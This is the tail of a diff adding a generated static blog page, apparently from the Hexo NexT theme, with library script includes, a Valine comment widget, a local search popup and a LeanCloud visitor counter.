+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v="></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: '3nEcwhMJTxkWHiNp8cMyOlAI-gzGzoHsz',
+        appKey: 'wxnCuxw6V0b0lAgx5kOUUOSp',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3nEcwhMJTxkWHiNp8cMyOlAI-gzGzoHsz", "wxnCuxw6V0b0lAgx5kOUUOSp");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
